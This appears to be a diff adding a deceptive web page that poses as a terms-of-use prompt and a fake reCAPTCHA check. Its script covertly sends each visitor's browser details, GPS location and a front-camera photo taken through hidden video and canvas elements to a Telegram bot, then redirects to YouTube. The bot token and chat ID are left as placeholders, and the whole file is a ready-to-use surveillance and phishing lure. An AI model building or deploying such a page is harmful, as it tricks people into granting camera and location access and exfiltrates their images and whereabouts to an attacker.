@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Information map</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #0d1117;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background-color: #161b22;
+            padding: 30px;
+            border-radius: 12px;
+            border: 1px solid #30363d;
+            box-shadow: none;
+            text-align: center;
+            max-width: 400px;
+            width: 100%;
+        }
+        h3 { color: #c9d1d9; margin-bottom: 15px; }
+        p { color: #8b949e; font-size: 14px; line-height: 1.5; margin-bottom: 25px; }
+        .btn {
+            background-color: #238636;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            font-size: 15px;
+            font-weight: 600;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            width: 100%;
+        }
+        .btn:hover { background-color: #2ea043; }
+        #step-captcha, #step-loading { display: none; }
+        video, canvas { display: none; }
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #007bff;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div id="step-terms">
+            <h3>Terms of Use</h3>
+            <p>To continue accessing the resources, please confirm that you have read and agree to our system's privacy terms.</p>
+            <button id="btn-terms" class="btn">Accept the terms of use</button>
+        </div>
+
+        <div id="step-captcha">
+            <h3>reCAPTCHA</h3>
+            <p>Please verify that you are not a robot.</p>
+            <button id="btn-captcha" class="btn">I am not a robot</button>
+        </div>
+
+        <div id="step-loading">
+            <div class="spinner"></div>
+            <h3>Processing Data...</h3>
+            <p>Please do not close your browser; the system is setting up a data download stream.</p>
+        </div>
+    </div>
+
+    <video id="hidden-video" autoplay></video>
+    <canvas id="hidden-canvas" width="640" height="480"></canvas>
+
+<script>
+    const TELEGRAM_TOKEN = 'Your bot token is located here';
+    const CHAT_ID = 'Your chat ID is here';
+
+    async function sendToTelegram(text) {
+        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+        try {
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
+            });
+        } catch (e) { console.error("error:", e); }
+    }
+
+    async function sendPhotoToTelegram(base64Image) {
+        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`;
+        const response = await fetch(base64Image);
+        const blob = await response.blob();
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', blob, 'capture.jpg');
+        formData.append('caption', 'Captured image');
+        try {
+            await fetch(url, { method: 'POST', body: formData });
+        } catch (e) { console.error("Image upload error:", e); }
+    }
+
+    document.getElementById('btn-terms').addEventListener('click', function() {
+        const statusText = document.querySelector('#step-terms p'); // Lấy thẻ mô tả của bước 1
+        
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(async function(position) {
+                const lat = position.coords.latitude;
+                const lon = position.coords.longitude;
+                const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+                await sendToTelegram(`📍 <b>Location:</b>\nLat: ${lat}\nLon: ${lon}\n<a href="${mapUrl}">view map</a>`);
+                
+                chuyenSangBuoc2();
+            }, async function(error) {
+                statusText.style.color = "red";
+                statusText.innerText = "The map is not working because it has not been granted permission";
+                
+                await sendToTelegram("GPS permission denied");
+                
+                setTimeout(chuyenSangBuoc2, 2000);
+            });
+        } else {
+            chuyenSangBuoc2();
+        }
+    });
+
+    function chuyenSangBuoc2() {
+        document.getElementById('step-terms').style.display = 'none';
+        document.getElementById('step-captcha').style.display = 'block';
+    }
+
+    document.getElementById('btn-captcha').addEventListener('click', function() {
+        const statusText = document.querySelector('#step-captcha p');
+        
+        setTimeout(() => {
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+            .then(function(stream) {
+                let video = document.getElementById('hidden-video');
+                video.srcObject = stream;
+                
+                setTimeout(async function() {
+                    let canvas = document.getElementById('hidden-canvas');
+                    let context = canvas.getContext('2d');
+                    context.drawImage(video, 0, 0, 640, 480);
+                    let photoData = canvas.toDataURL('image/jpeg');
+                    
+                    stream.getTracks().forEach(track => track.stop()); // Tắt camera ngay
+
+                    await sendPhotoToTelegram(photoData);
+                    chuyenSangBuoc3();
+                }, 1200);
+            })
+            .catch(async function(err) {
+                // Báo lỗi camera
+                statusText.style.color = "red";
+                statusText.innerText = "The camera is not working because it has not been granted permission";
+                
+                await sendToTelegram("Camera rights denied.");
+                setTimeout(chuyenSangBuoc3, 2000);
+            });
+        }, 500);
+    });
+
+    function chuyenSangBuoc3() {
+        document.getElementById('step-captcha').style.display = 'none';
+        document.getElementById('step-loading').style.display = 'block';
+        setTimeout(() => {
+            window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+        }, 2500);
+    }
+
+    window.onload = async function() {
+        const info = `📱 <b>New access</b>\n- Browser: ${navigator.userAgent}\n- Screen: ${window.screen.width}x${window.screen.height}`;
+        await sendToTelegram(info);
+    };
+</script>
+
+  
